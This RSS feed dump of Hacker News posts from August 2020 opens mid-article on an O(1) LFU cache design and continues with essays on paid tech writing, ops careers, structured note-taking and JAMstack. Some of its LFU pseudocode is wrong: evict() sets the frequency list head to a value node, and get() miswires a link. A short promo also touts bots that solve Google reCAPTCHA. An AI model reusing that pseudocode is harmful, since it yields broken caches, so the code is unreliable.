<p>Although the identification of the element to be evicted is quick, but in order for the heap to maintain its property - element with lowest access frequency be at the top - it demands a rebalance, and this rebalancing process has a running complexity of <code>O(log n)</code>. To make things worse, rebalancing is required every single time the frequency of an item is changed; which means that in the cache that implements LFU, every time an item is either inserted, accessed or evicted, a rebalance is required - making all the three core operations to have the time complexity of <code>O(log n)</code>.</p>

<p>The LFU cache can be implemented with <code>O(1)</code> complexity for all the three operations by using one <a href="https://en.wikipedia.org/wiki/Hash_table">Hash Table</a> and a bunch of <a href="https://en.wikipedia.org/wiki/Doubly_linked_list">Doubly Linked Lists</a>. As stated by the <a href="https://arpitbhayani.me/blogs/rum">RUM Conjecture</a>, in order to get a constant time reads and updates operations, we have to make a compromise with memory utilization. This is exactly what we observe in this implementation.</p>
<h2>The Hash Table</h2>
<p>The Hash Table stores the mapping of the cached key to the Value Node holding the cached value. The value against the key is usually a pointer to the actual Value Node. Given that the lookup complexity of the hash table is <code>O(1)</code>, the operation to access the value given the key from this Hash Table could be accomplished in constant time.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/90469594-e2561f80-e136-11ea-9ff4-8369a7ea3df3.png" alt="LFU hash table"></p>
<p>The illustration above depicts that the Hash Table holding cache keys <code>k1</code>, <code>k2</code>, etc are mapped to the nodes holding the values <code>v1</code> and <code>v2</code> through direct pointers. The nodes are allocated on the heap using dynamic allocation, hence are a little disorganized. The Value Node to which the key maps to, not only hold the cached value, but it also holds a few pointers pointing to different entities in the system, enabling constant-time operations.</p>
<h2>Doubly Linked Lists</h2>
<p>This implementation of LFU requires us to maintain one Doubly Linked List of frequencies, called <code>freq_list</code>, holding one node for each unique frequency spanning all the caches values. This list is kept sorted on the frequency the node represents such that, the node representing the lowest frequency is on the one end while the node representing the highest frequency is at the other.</p>
<p>Every Frequency Node holds the frequency that it represents in the member <code>freq</code> and the usual <code>next</code> and <code>prev</code> pointers pointing to the adjacent Frequency Nodes; it also keeps a <code>values_ptr</code> which points to another doubly-linked list holding Value Nodes (referred in the hash table) having the same access frequency <code>freq</code>.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/90469593-e08c5c00-e136-11ea-995b-e4590981dd89.png" alt="lists LFU"></p>
<p>The overall schematic representation of doubly-linked lists and its arrangement is as shown in the illustration above. The doubly-linked list holding Frequency Nodes is arranged horizontally while the list holding the Value Nodes is arranged vertically, for clearer view and understanding.</p>
<p>Since the cached values <code>v1</code> and <code>v7</code> both have been accessed <code>7</code> times, they both are chained in a doubly-linked list and are hooked with the Frequency Node representing the frequency of <code>7</code>. Similarly, the Value Nodes holding values <code>v5</code>, <code>v3</code>, and <code>v9</code> are chained in another doubly-linked list and are hooked with the Frequency Node representing the frequency of <code>18</code>.</p>
<p>The Value Node contains the cached value in member <code>data</code>, along with the usual <code>next</code> and <code>prev</code> pointers pointing to the adjacent Value Nodes in the list. It also holds a <code>freq_pointer</code> pointing back to the Frequency Node to which the list if hooked at. Having all of these pointers helps us ensure all the three operations happen in constant time.</p>
<p>Now that we have put all the necessary structures in place, we take a look at the 3 core operations along with their pseudo implementation.</p>
<h2>Adding value to the cache</h2>
<p>Adding a new value to the cache is a relatively simpler operation that requires a bunch of pointer manipulations and does the job with a constant time running complexity. While inserting the value in the cache, we first check the existence of the key in the table, if the key is already present and we try to put it again the function raises an error. Then we ensure the presence of the Frequency Node representing the frequency of <code>1</code>, and in the process, we might also need to create a new frequency node also. Then we wrap the value in a Value Node and adds it to the <code>values_list</code> of this Frequency Node; and at last, we make an entry in the table acknowledging the completion of the caching process.</p>
<pre><code><span><span>def</span> <span>add</span><span>(key: str, value: object)</span>:</span>
    
    
    <span>if</span> key <span>in</span> table:
        <span>raise</span> KeyAlreadyExistsError

    
    
    value_node = make_value_node(value)

    first_frequency_node = freq_list.head
    <span>if</span> first_frequency_node.freq != <span>1</span>:
        
        
        first_frequency_node = make_frequency_node(<span>1</span>)

        
        
        
        first_frequency_node.next = freq_list.head
        freq_list.head.prev = first_frequency_node
        freq_list.head = first_frequency_node

    
    value_node.freq_pointer = first_frequency_node

    
    first_frequency_node.values.add(value_node)

    
    table[key] = value_node
</code></pre>
<p>As seen in the pseudocode above the entire procedure to add a new value in the cache is a bunch of memory allocation along with some pointer manipulations, hence we observe that the running complexity of <code>O(1)</code> for this operation.</p>
<h2>Evicting an item from the cache</h2>
<p>Eviction, similar to insertion, is a trivial operation where we simply pick the frequency node with lowest access frequency (the first node in the <code>freq_list</code>) and remove the first Value Node present in its <code>values_list</code>. Since the entire eviction also requires pointer manipulations, it also exhibits a running complexity of <code>O(1)</code>.</p>
<pre><code><span><span>def</span> <span>evict</span><span>()</span>:</span>
    <span>if</span> freq_list.head <span>and</span> freq_list.head.values:
        first_value_node = freq_list.head.values.first
        second_value_node = first_value_node.next

        
        freq_list.head = second_value_node

        
        second_value_node.prev = <span>None</span>

        
        delete_value_node(first_value_node)

    <span>if</span> freq_list.head <span>and</span> <span>not</span> freq_list.head.values:
        
        
        delete_frequency_node(freq_list.head)
</code></pre>
<h2>Getting a value from the cache</h2>
<p>Accessing an item from the cache has to be the most common operation of any cache. In the LFU scheme, before returning the cached value, the engine also has to update its access frequency. Ensuring the change in access frequency of one cached value does not require some sort of rebalancing or restructuring to maintain the integrity, is what makes this implementation special.</p>
<p>The engine first makes a get call to the Hash Table to check that the key exists in the cache. Before returning the cached value from the retrieved Value Node, the engine performs the following operations - it accesses the Frequency Node and its sibling corresponding to the retrieved Value Node. It ensures that the frequency of the sibling is 1 more than that of the Frequency Node; if not it creates the necessary Frequency Node and place it as the new sibling. The Value Node then changes its affinity to this sibling Frequency Node so that it correctly matches the access frequency. In the end, the back pointer from the Value Node to the new Frequency Node is set and the value is returned.</p>
<pre><code><span><span>def</span> <span>get</span><span>(key: str)</span> -&gt; object:</span>
    
    value_node = table.get(key, <span>None</span>)

    
    
    <span>if</span> <span>not</span> value_node:
        <span>raise</span> KeyNotFoundError

    
    
    frequency_node = value_node.freq_pointer

    
    
    
    next_frequency_node = frequency_node.next

    <span>if</span> next_frequency_node.freq != frequency_node.freq + <span>1</span>:
        
        new_frequency_node = make_frequency_node(frequency_node.freq + <span>1</span>)
        
        
        frequency_node.next = new_frequency_node
        new_frequency_node.prev = frequency_node

        next_frequency_node.prev = new_frequency_node
        new_frequency_node.next = frequency_node

        
        
        next_frequency_node = new_frequency_node

    
    next_frequency_node.values.add(value_node)
    
    
    value_node.freq_pointer = next_frequency_node
    value_node.next = <span>None</span>
    value_node.prev = next_frequency_node.values.last
    
    
    
    <span>if</span> len(frequency_node.values) == <span>0</span>:
        delete_frequency_node(frequency_node)

    
    <span>return</span> value_node.value
</code></pre>
<p>Again, since this operation also only deals with pointer manipulations through direct pointers, the running time complexity of this operation is also constant …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://arpitbhayani.me/blogs/lfu">https://arpitbhayani.me/blogs/lfu</a></em></p>]]>
            </description>
            <link>https://arpitbhayani.me/blogs/lfu</link>
            <guid isPermaLink="false">hacker-news-small-sites-24251182</guid>
            <pubDate>Sun, 23 Aug 2020 11:36:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A list of websites that pay you to write technical articles]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24251140">thread link</a>) | @Didicodes
<br/>
August 23, 2020 | https://catalins.tech/websites-that-pay-you-to-write-technical-articles | <a href="https://web.archive.org/web/*/https://catalins.tech/websites-that-pay-you-to-write-technical-articles">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1598000473709/56FT93bJf.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text">

<hr>

<p>Getting paid to write technical articles is a great way to supplement your income. Especially if you already write articles for your blog. However, the first question that arises is "<em>how can I get opportunities?</em>", which was my question too. </p>
<p>As a result, I want to list a handful of websites that pay you to write technical articles for them. You can see their name, the URL, and the approximate sum they pay you.</p>

<p>Therefore, let us see the websites you can pitch to write articles. The most popular publications are as follows:</p>
<table>
<thead>
<tr>
<td>Name</td><td>Rate per article</td><td>Description</td><td>URL</td></tr>
</thead>
<tbody>
<tr>
<td>Twilio</td><td>Up to $500 per article</td><td>You are not required to use Twilio. You need to write articles with examples</td><td><a target="_blank" href="https://go.twilio.com/twilio-voices/">Twilio.com</a></td></tr>
<tr>
<td>Auth0</td><td>Up to $300 per article</td><td>You pick topics from a list of possible articles</td><td><a target="_blank" href="https://auth0.com/guest-authors">Auth0</a></td></tr>
<tr>
<td>Soshace</td><td>$100 per article</td><td>You pick topics from a list of possible articles</td><td><a target="_blank" href="https://docs.google.com/document/d/1DZ9Hj8AcNfHI6bC4bfTDIFRNIIFnda6Mkj_n_4x3hWw/edit">Soshace</a></td></tr>
<tr>
<td>StackOverflow</td><td>Unknown</td><td>There are no limitations on the topics</td><td><a target="_blank" href="https://stackoverflow.blog/2020/01/27/blog-contributor-guidelines/?cb=1">StackOverflow</a></td></tr>
<tr>
<td>WPHub</td><td>Up to $200 per article</td><td>Tutorials about Wordpress</td><td><a target="_blank" href="https://www.wphub.com/write-for-us/">WPHub</a></td></tr>
<tr>
<td>Vonage</td><td>Up to $500 per article</td><td>Technical tutorials</td><td><a target="_blank" href="https://developer.nexmo.com/spotlight/">Vonage</a></td></tr>
<tr>
<td>CircleCI</td><td>Up to $300 per article</td><td>You can pick from a list of possible topics</td><td><a target="_blank" href="https://circleci.com/blog/guest-writer-program/">CircleCI</a></td></tr>
<tr>
<td>Clubhouse Io</td><td>Up to $600 per article</td><td>Pick from a list of possible topics. Technical tutorials, and how-to guides.</td><td><a target="_blank" href="https://clubhouse.io/clubhouse-write-earn-give-program/">Clubhouse.io</a></td></tr>
<tr>
<td>Code Tuts+</td><td>$100 for tips, and $250 for tutorials</td><td>Pick from a list of possible articles</td><td><a target="_blank" href="https://code.tutsplus.com/articles/call-for-authors-write-for-tuts--cms-22034">Code Tuts+</a></td></tr>
<tr>
<td>Tutorialspoint</td><td>Up to $500 per article</td><td>Various technical topics. You pick from a list of topics</td><td><a target="_blank" href="https://www.tutorialspoint.com/about/tutorials_writing.htm">Tutorialspoint</a></td></tr>
<tr>
<td>CSS Tricks</td><td>Up to $250 per article</td><td>CSS articles</td><td><a target="_blank" href="https://css-tricks.com/guest-posting/">CSS Tricks</a></td></tr>
<tr>
<td>Digital Ocean</td><td>Up to $400 per article</td><td>Articles about OSS, infrastructure, cloud hosting, Linux, and more. It's not limited to their products</td><td><a target="_blank" href="https://www.digitalocean.com/write-for-donations/">Digital Ocean</a></td></tr>
<tr>
<td>Hasura</td><td>Up to $300 per article</td><td>Articles including Hasura or GraphQL</td><td><a target="_blank" href="https://blog.hasura.io/the-hasura-technical-writer-program/">Hasura</a></td></tr>
<tr>
<td>TestDriven Io</td><td>Up to $500 per article</td><td>Web development tutorials designed to teach critical skills needed to test, launch, scale, and optimize applications</td><td><a target="_blank" href="https://testdriven.io/blog/">TestDriven Io</a></td></tr>
</tbody>
</table>

<p>Be aware; I did not come with this list of publications. I put together (most of) the publications from <a target="_blank" href="https://github.com/malgamves/CommunityWriterPrograms">Paid Community Writer Programs</a>, and <a target="_blank" href="https://whopaystechnicalwriters.com/">Who Pays Technical Writers</a> together. <strong>Also, in the article you can see some of the most popular publications. For a more comprehensive list, with more publications, visit the above links</strong>.</p>
<p>Therefore, I hope it helps you to create an additional income. Also, keep an eye on these two sources in case they add more publications. </p>
<blockquote>
<p>If you enjoyed the article, consider sharing it so more people can benefit from it! Also, feel free to @ me on Twitter with your opinions.</p>
</blockquote>
</div></div></section></div></div>]]>
            </description>
            <link>https://catalins.tech/websites-that-pay-you-to-write-technical-articles</link>
            <guid isPermaLink="false">hacker-news-small-sites-24251140</guid>
            <pubDate>Sun, 23 Aug 2020 11:23:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Automate third-party tools without API or writing a single line of code]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24251082">thread link</a>) | @kinderjaje
<br/>
August 23, 2020 | https://community.vanila.io/automatio/general/automate-third-party-tools-without-api-or-writing-a-single-line-of-code~90f13832-1d14-4961-8bd7-a72fa98011de | <a href="https://web.archive.org/web/*/https://community.vanila.io/automatio/general/automate-third-party-tools-without-api-or-writing-a-single-line-of-code~90f13832-1d14-4961-8bd7-a72fa98011de">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Less than 1% of web have API. This means if the website or web app doesn't provide API, you will need to build a bot and automate it. If you are not programmer, it means you will need to hire someone to do it, which takes a lot of time and money. Even if you are a web developer, still it gonna take you days or weeks, depending on complexity. But!</p><h3>Meet Automatio</h3><p>This is how you can automate third-party tools without API or writing a single line of code. In this case, I am automating a website/tool for checking domain authority (DA) of the given URL.</p><p>Automatio will be able to deal with the complex scenario of inputting data (URL) into the input field, then solving Google re-captcha, clicking on the submit button, and then extracting the data we need.</p><p>🤖 Built with <a href="https://automatio.co/" target="_blank">Automatio</a> - No Code Web Automation Tool</p><p>🎥 Video URL: <a href="https://youtu.be/3KMDeQo8In8" target="_blank" rel="noopener nofollower">https://youtu.be/3KMDeQo8In8</a></p><p><iframe title="iframe-https://www.youtube.com/embed/3KMDeQo8In8" width="100%" height="200" allowfullscreen="" frameborder="0" src="https://www.youtube.com/embed/3KMDeQo8In8"></iframe></p></div></div></div>]]>
            </description>
            <link>https://community.vanila.io/automatio/general/automate-third-party-tools-without-api-or-writing-a-single-line-of-code~90f13832-1d14-4961-8bd7-a72fa98011de</link>
            <guid isPermaLink="false">hacker-news-small-sites-24251082</guid>
            <pubDate>Sun, 23 Aug 2020 11:05:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Future of Ops Jobs]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24250861">thread link</a>) | @kiyanwang
<br/>
August 23, 2020 | https://acloudguru.com/blog/engineering/the-future-of-ops-jobs | <a href="https://web.archive.org/web/*/https://acloudguru.com/blog/engineering/the-future-of-ops-jobs">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-id="8a920a5" data-element_type="widget" data-widget_type="theme-post-content.default">
				<div>
			<p><span>Infrastructure, ops, devops, systems engineering, sysadmin, infraops, SRE, platform engineering. As long as I’ve been doing computers, these terms have been effectively synonymous. If I wanted to tell someone what my job was, I could throw out any one of them and expect to be understood.</span></p>
<p><span>Every tech company had a software engineering team that built software and an operations team that built infrastructure for running that software. At some point in the past decade they would have renamed this operations team to “devops” or “SRE”, but whatever the name, that was my team and those were my people.</span></p>
<p><span>But unless you’re an infrastructure company, infrastructure is not your mission. Which means that every second you devote to infrastructure work — and every engineer you devote to infrastructure problems — is a distraction from your core goals.&nbsp;</span></p>
<p><span>What’s more, it’s a distraction that builds on itself. The more time and energy you spend on infrastructure, the more your focus gets scattered, and the more you deprive yourself of the time and energy that ought to be devoted to the problems your business exists to solve.</span></p>
<p><span>This isn’t exactly new. Infrastructure and operations have always been a distraction from your core business problems. It used to be the case that every company had to grow internal expertise in hardware, datacenters, networking, operating systems, config management, and so on up the tech stack until reaching their core business problems. Infrastructure and ops have always been a distraction, but until recently, a necessary one. A means to an end.</span></p>
<p><span>So what’s changed? These days, you increasingly have a choice. Sure, you </span><i><span>can</span></i><span> build all that internal expertise, but every day more and more of it is being served up via API on a silver platter.</span></p>
<p><span>Does this mean that operations is no longer important, no longer necessary? Far from it. Operations and operability are more important than ever. Let’s take a look at what’s happening to the ops profession at a high level, the emerging challenges we face, and the impact this’ll all have on our careers.&nbsp;</span></p>
<h3><b>Changes afoot</b></h3>
<p><span>Beyond the broader move into to cloud services, here are some of the major shifts on our horizon.</span></p>
<h5><b>From monolith to microservices</b></h5>
<p><span>Much has been written about the operational demands of a microservices architecture. Now that functions calling other functions involves a network hop, operational concerns are an unavoidable part of debugging even the most trivial problems. Microservices change the game from “building code” to “building systems”, which pushes more and more code writing into the realm of operations.</span></p>
<h5><b>From monitoring to observability</b></h5>
<p><span>Metric-based tools like Prometheus and DataDog are infrastructure monitoring tools, and quite good ones at that. When you’re responsible for infrastructure, the questions you care about are of aggregates and trends, thresholds and capacity. Monitoring tools are the right tool for the job, because that’s how you understand whether your infrastructure is healthy, and what actions to take to make it or keep it healthy.</span><span><br>
</span><span><br>
</span><span>Observability tools*, on the other hand, are for the people writing and shipping code to users every day, and trying to inspect and understand behavior at the nexus of users, production, and code. Observability tools preserve the full context of the request. This allows you to slice and dice and tease out new correlations, as well as view events in a waterfall by time (“tracing”). Observability is how you connect the dots between software and real business impact, and between your engineers’ experience and your users’ experience. </span><span><br>
</span><span><br>
</span><i><span>*Caution: many monitoring tools are trying to rebrand themselves as observability tools without first building the necessary functionality. To tell the difference, </span></i><a href="https://www.honeycomb.io/blog/so-you-want-to-build-an-observability-tool/"><i><span>see here</span></i></a><i><span>.</span></i></p>
<h5><b>From magic autoinstrumentation to instrumenting with intent</b></h5>
<p><span>Instrumentation is just another form of commenting and documenting your code. There are tools that promise to do it automatically for you, but they aren’t great at capturing intent.. Auto-instrumentation can tell you loads of ancillary details, but they will </span><i><span>never</span></i><span> let you divine the business value intended by the engineer who built it. So suck it up and instrument your code.</span></p>
<h3><b>Ops is dead. Long live ops.</b></h3>
<p><span>Ops teams are going the way of the dodo bird, yet operability, resiliency, and reliability have never been more important. The role of operations engineers is changing fast, and the role is bifurcating along the question of infrastructure. In the future, people who would formerly have called themselves “operations engineers” (or devops engineers) will get to choose between a role that emphasizes </span><i><span>building infrastructure software as a service </span></i><span>and a role that uses their infrastructure expertise to help teams of engineers ship software more effectively and efficiently…generally by building as little infrastructure as possible.</span></p>
<p><span>If your heart truly beats for working on infrastructure problems, you’re in luck! — there are more of those than ever. Go join an infrastructure company. Try one of the many companies — AWS, Azure, all the many developer tooling companies — whose mission consists of building infrastructure software, of being the best in the world at infrastructure, and selling that expertise to other companies. There are roles for software engineers who enjoy building infrastructure solutions as a service, and there are even specialist ops roles for running and operating that infrastructure at scale, or administering those data services at scale.&nbsp;</span></p>
<p><span>Otherwise, embrace the fact that your job consists of </span><i><span>building systems to enable teams of engineers to ship software that creates core business value</span></i><span>, which means home brewing as little infrastructure as possible. And what’s left?</span></p>
<h5><b>Vendor engineering</b><span>&nbsp;</span></h5>
<p><span>Effectively outsourcing components of your infrastructure and weaving them together into a seamless whole involves a great deal of architectural skill and domain expertise. This skill set is both rare and incredibly undervalued, especially considering how pervasive the need for it is. Think about it. If you work at a large company, dealing with other internal teams should feel like dealing with vendors. And if you work at a small company, dealing with other vendors should feel like dealing with other teams.&nbsp;</span></p>
<p><span>Anyone who wants a long and vibrant career in SRE leadership would do well to invest some energy into areas like these:</span></p>
<ul>
<li><span>Learn to evaluate vendors and their products effectively. Ask piercing, probing questions to gauge compatibility and fit. Determine which areas of friction you can live with and which are dealbreakers.</span></li>
<li><span>Learn to calculate and quantify the cost of your and your team’s time and labor. Be ruthless about shedding as much labor as possible in order to focus on your core business.&nbsp;</span></li>
<li><span>Learn to manage the true cost of ownership, and to advocate and educate internally for the right solution, particularly by managing up to execs and finance folks.</span></li>
</ul>
<h5><b>Product engineering</b><span>&nbsp;</span></h5>
<p><span>One of the great tragedies of infrastructure is how thoroughly most of us managed to evade the past 20+ years of lessons in managing products and learning how to work with designers. It’s no wonder most infrastructure tools require endless laborious trainings and certifications. They simply weren’t built like modern products for humans.</span></p>
<ul>
<li><span>I recommend a crash course. Embed yourself within a B2B or B2C feature delivery team for a spell. Learn their rhythms, learn their language, soak up some of their instincts. You’ll need them to balance and blend your instincts for architectural correctness, scaling patterns, and firefighting.</span></li>
<li><span>You don’t have to become an expert in shipping features. But you should learn the elements of relationship-building the way a good product manager does. And you must learn enough about the product lifecycle that you can help debug and divert teams whose roadmaps are hopelessly intertwined and whose roadmaps are grinding to a halt.</span></li>
</ul>
<h5><b>Sociotechnical systems engineering</b><span>&nbsp;</span></h5>
<p><span>The irreducible core of the SRE/devops skill set increasingly revolves around crafting and curating efficient, effective sociotechnical feedback loops that enable and empower engineers to ship code — to move swiftly, with confidence. Your job is not to say “no” or throw up roadblocks, it’s to figure out how to help them get to yes.</span></p>
<ul>
<li><span>Start with embracing releases. Lean hard into the deploy pipeline. The safest diff is the smallest diff, and you should ship automatically and compulsively. Optimize tests, CI/CD, etc so that deploys happen automatically upon merge to main, so that a single mergeset gets deployed at a time, there are no human gates, and everything goes live automatically within a few minutes of a developer committing their code. This is your holy grail, and most teams are nowhere near there.</span></li>
<li><span>Design and optimize on-call rotations that load balance the effort fairly and sustainably, and won’t burn people out. Apply the appropriate amount of pressure on management to devote enough time to reliability and fixing things versus just shipping new features. Hook up the feedback loops so that the people who are getting alerted are the ones empowered and motivated to fix the problems that are paging them. Ideally, you should page the person who made the change, every time.</span></li>
<li><span>Foster a culture of ownership and accountability while promulgating blamelessness throughout the org. Welcome engineers into production, and help them navigate production waters happily and successfully.</span></li>
</ul>
<h5><b>Managing the portfolio of technical investments.</b></h5>
<ul>
<li><span>Operability is the longest term investment / primary source of technical debt, so no one is better positioned to help evaluate and amortize those risks than ops engineers. It is effectively free to write code, compared to the gargantuan resources it takes to run that code and tend to it over the years.</span></li>
<li><span>Get excellent at migrations. Leave no trailing, stale remnants of systems behind to support — those are a terrible drain on the team. Surface this energy drain to decision-makers instead of …</span></li></ul></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://acloudguru.com/blog/engineering/the-future-of-ops-jobs">https://acloudguru.com/blog/engineering/the-future-of-ops-jobs</a></em></p>]]>
            </description>
            <link>https://acloudguru.com/blog/engineering/the-future-of-ops-jobs</link>
            <guid isPermaLink="false">hacker-news-small-sites-24250861</guid>
            <pubDate>Sun, 23 Aug 2020 10:09:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Runtime for Structured Thought]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24250812">thread link</a>) | @lioeters
<br/>
August 23, 2020 | https://thesephist.com/posts/structured-thought/ | <a href="https://web.archive.org/web/*/https://thesephist.com/posts/structured-thought/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        <p>When we write thoughts and ideas down with words for future recollection and synthesis, we take the stuff of abstract concepts, and collapse them down into a one-dimensional string of characters. For even the best, most careful writers, I think our ideas lose a lot of fidelity in this dramatic reduction in expressiveness of thoughts and their relationships to each other.</p>
<p>Our thoughts <em>in vivo</em> take on all kinds of shapes, and are connected in a myriad of relationships – by analogy, by example, by superset/subset relations, and so on. When we taxidermy them out onto paper or through the keyboard, we’re forced to flatten these relationships out onto a single dimension, usually nested bulleted links with verbal references  that leap across the page arbitrarily to connect related ideas to each other. Just think of the last time you jot down an idea in your note-taking method of choice – how much freedom did the medium afford you? At best, you’re writing freeform, pen-on-paper, and you draw arrows between related ideas and underline the important parts; typing on a keyboard into a text box is even more restrictive.</p>
<p>The internal structure of individual ideas vary even more greatly. Some thoughts contain lists of things, others are about comparisons between categories of things, and there are probably many more that can’t be named or enumerated or denoted with just a few lines going across the page between sentences. The state of the art in high-fidelity recording of our thoughts, in my opinion, is still handwriting on paper (or your digital handwriting app of choice). But here, we effectively lose our ability to search through information quickly, when we need it, because unlike bulleted lists, the information we hand-write isn’t <em>structured</em>.</p>
<p>This yields the question, <strong>how should we store and retrieve ideas in written form, so our workflows better preserve the living structure of thoughts?</strong></p>
<p>
<img src="https://thesephist.com/img/structured-thought.jpg" alt="Structured thought">
</p>
<p>I’ve previously noted <a href="https://linus.coffee/note/abstraction/">the parallelism and contrast between programming and written languages</a>. I think the more precise, multi-dimensional language of computers may be better suited for articulating relationships between our ideas in the written form.</p>
<h2 id="structured-thought">Structured thought</h2>
<p>Why might programming languages be better suited for recording relationships between ideas than the written word?</p>
<p>One reason is that programming languages are purpose-designed for building up living data structures. Programs, in their normal course of life, build up precise lists and trees and other complex structures of values. If there were a programming language as such, whose primitive values were units of thought or ideas instead of integers and strings and arrays, would we be able to record and retrieve our past ideas more effectively? In other words, what if there was some sort of a <a href="https://en.wikipedia.org/wiki/Domain-specific_language">domain-specific language</a> for better note-taking? Can we view the macro-structure of our thoughts as a highly specialized, highly complex data structure that we can encode into programs? Probably not entirely, but for the more analytical ideas, I think it’s a thought experiment we can entertain using new and interesting tools.</p>
<p>The most promising tool I’ve found exploring this direction is <a href="https://roamresearch.com/">Roam Research</a>. It stores ideas in a fluid, cross-linkable and searchable database of <a href="https://en.wikipedia.org/wiki/Hypertext">hypertext</a>. But Roam is still pretty restricted to nested relationships and bidirectional links between ideas (though I admittedly haven’t tried it in depth). I think there’s lots of headroom here in the market for exploring more general data structures for ideas, and for allowing note-takers to create their own structures and layouts.</p>
<h2 id="a-runtime-for-human-abstractions">A runtime for human abstractions</h2>
<p>I think an ideal future extension of this idea isn’t just a written format that can be queried like Roam or some kind of a programming language, but an omnipresent, ambient <a href="https://en.wikipedia.org/wiki/Runtime_system"><em>runtime</em></a> for our thoughts and ideas – one that can interact fluidly with our environment and context, and maybe even preempt our recollections and augment our ability to sift through our ideas from the past and present.</p>
<p>Sci-fi literature has imagined an endless taxonomy of ways for humans to externalize our minds onto offboard computers and networks of mechanical brains, most of which yield the control of our memory storage and recollection to some artificial and autonomous system. But I think there are ways to extend our minds using more primitive tools like better notes, and a more carefully crafted runtime for structured thought. One where we continue to drive interactions with our memory, albeit with more powerful tools in hand to record what we think, and remember them at the right times, when we need them.</p>

        <hr>
        <p>
            If you enjoyed this piece, you might also enjoy
            
            my next post,
            <a href="https://thesephist.com/posts/unbundling-cloud/"><em>Unbundling cloud</em></a>.
            
        </p>
        <p>
            I share new posts like this on my <a href="https://thesephist.com/#newsletter">newsletter.</a>
            If you liked this post, you should consider joining the list.
        </p>
        <p>Have a comment or response? You can <a href="https://thesephist.com/#contact">email me.</a></p>
    </article></div>]]>
            </description>
            <link>https://thesephist.com/posts/structured-thought/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24250812</guid>
            <pubDate>Sun, 23 Aug 2020 09:50:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[JAMstack vs. Traditional Monolithic Workflow]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24250794">thread link</a>) | @atapas
<br/>
August 23, 2020 | https://blog.greenroots.info/jamstack-vs-traditional-monolithic-workflow-cke6wmr0o00tzxms1dkid7so5 | <a href="https://web.archive.org/web/*/https://blog.greenroots.info/jamstack-vs-traditional-monolithic-workflow-cke6wmr0o00tzxms1dkid7so5">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p>Welcome to the second article of the series, <a target="_blank" href="https://hashnode.com/series/jamstack-for-all-cke19xxge004uvls1auha9inv">JAMstack for All</a>. I would like to thank you for your likes, comments and feedback on the <em><a target="_blank" href="https://blog.greenroots.info/jamstack-for-all-an-introduction-cke2fxc5800jvabs15lhn4a9x">JAMstack Introduction</a></em> article. </p>
<p>In this article, we will be diving into the JAMstack workflow with a side-by-side comparison of the traditional, monolithic workflow. We will also understand that, JAMstack and SPA(single page application) are not same. </p>
<p>I have introduced the phrase <code>prebuilt markup</code> to you in the introductory article. It is a very powerful concept and promises lots to perform. We will see how the pre-building is going to help us achieve an important pillar or user experience, i.e., <code>speed</code>.</p>
<blockquote>
<p>If you haven't read the previous article of the series yet, you can find it here, <a target="_blank" href="https://blog.greenroots.info/jamstack-for-all-an-introduction-cke2fxc5800jvabs15lhn4a9x">JAMstack for All: An Introduction</a>. I would recommend you to read this for a better clarity on the history, what, why part of the JAMstack story.</p>
</blockquote>

<p>As per the report from <a target="_blank" href="https://wearesocial.com/blog/2020/01/digital-2020-3-8-billion-people-use-social-media">wearesocial.com</a>, roughly 53% of all web page requests come from mobile phones, computers account for 44% of the total. This report was published in January 2020 and it shows that, the mobile usage share is increasing steadily over the years.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598151207392/QBCjPko_Z.png?auto=format&amp;q=60" alt="we_are_social.png"></p>
<p>Just like myself, many of the mobile users are impatient. They do not like to wait longer for a page load, hate initial white screen or a loading indicator for long. Depending on the economy, place of living and earning, the types of mobile and the computation power differ. </p>
<p>There are still many users out there with single core mobile devices. There are users with high end mobiles with great hardware support. However speed is one of the  common needs for both the user classes. Do you know what? The users with high end mobile devices are more impatient than others, as they are used to the <code>fast</code> environment so much.</p>
<p>As an application developer, we need to count this important user expectation and design the experience accordingly. We need to make sure, the page loads faster. We must get users the required initial bytes of page information as soon as possible to reduce a <code>cold start</code>.</p>

<p>One of the characteristics of JAMstack is the markup should be <code>prebuilt</code>. It means, we as developers can spend a few extra seconds in the build phase of an application than, expecting a customer to get frustrated by burning those extra seconds at the run time. Our customers wouldn't care at all, if we spend the extra time in building the application.</p>
<p>A typical user mindset for an application load where lots are happening in the browser (screen-shot from <em>Matt Biilmann's JAMstack at Scale: why pre-built markup is critical</em> presentation):</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1598152532147/lthwdAoKm.png?auto=format&amp;q=60" alt="image.png"></p>
<p>A great amount of time goes in the initial load itself and it leads your users to bounce off the application or website easily. There is also a problem of not meeting user's expectation about the design. What if the users are not finding it useful and we have to rollback to the old state? Some production nightmares, isn't it?</p>
